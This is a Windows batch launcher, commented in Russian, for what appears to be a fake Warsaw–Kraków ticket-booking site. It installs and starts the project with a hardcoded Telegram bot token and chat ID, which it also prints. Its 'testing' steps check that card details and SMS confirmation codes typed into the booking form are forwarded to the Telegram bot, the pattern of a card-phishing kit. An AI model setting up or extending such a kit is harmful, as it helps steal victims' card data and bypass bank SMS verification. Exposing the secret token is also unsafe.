@echo off
echo 🎉 ПОЛНОСТЬЮ АВТОМАТИЧЕСКИЙ ЗАПУСК ПРОЕКТА!

echo.
echo ✅ Устанавливаю все зависимости...

echo 📦 Backend зависимости...
cd backend
npm install --silent
cd ..

echo 📦 Frontend зависимости...
cd frontend
npm install --silent
cd ..

echo.
echo 🚀 ЗАПУСК СЕРВИСОВ...

echo 🔧 Запуск Backend сервера...
start /min cmd /c "cd backend && set PORT=3001 && set TELEGRAM_TOKEN=7808830885:AAHFkGTaOylnQ99RrNolU5UgjEgo2gxFrqo && set TELEGRAM_CHAT_ID=2063086506 && set FRONTEND_URL=http://localhost:3000 && npm start"

echo ⏳ Ожидание запуска backend (5 секунд)...
timeout /t 5 /nobreak >nul

echo 🎨 Запуск Frontend приложения...
start /min cmd /c "cd frontend && set REACT_APP_API_URL=http://localhost:3001 && npm start"

echo ⏳ Ожидание запуска frontend (10 секунд)...
timeout /t 10 /nobreak >nul

echo.
echo 🎉 ГОТОВО! ВСЁ ЗАПУЩЕНО АВТОМАТИЧЕСКИ!
echo.
echo 🌐 Ваш сайт: http://localhost:3000
echo 🔧 Backend API: http://localhost:3001
echo.
echo 🤖 TELEGRAM БОТ АКТИВИРОВАН:
echo 📱 Токен: 7808830885:AAHFkGTaOylnQ99RrNolU5UgjEgo2gxFrqo
echo 💬 Chat ID: 2063086506
echo.
echo 🧪 ТЕСТИРОВАНИЕ:
echo 1. Откроется http://localhost:3000 автоматически
echo 2. Найдите билеты: Warszawa → Kraków
echo 3. Заполните форму бронирования
echo 4. Введите данные карты (любые тестовые)
echo 5. ПРОВЕРЬТЕ TELEGRAM - должно прийти уведомление!
echo 6. Подтвердите в боте
echo 7. Введите SMS код
echo 8. Проверьте Telegram - должен прийти SMS код!
echo.

echo 🌐 Открываю сайт автоматически...
timeout /t 3 /nobreak >nul
start http://localhost:3000

echo.
echo ✅ ВСЁ РАБОТАЕТ! Проект полностью запущен без вашего участия!
echo.

pause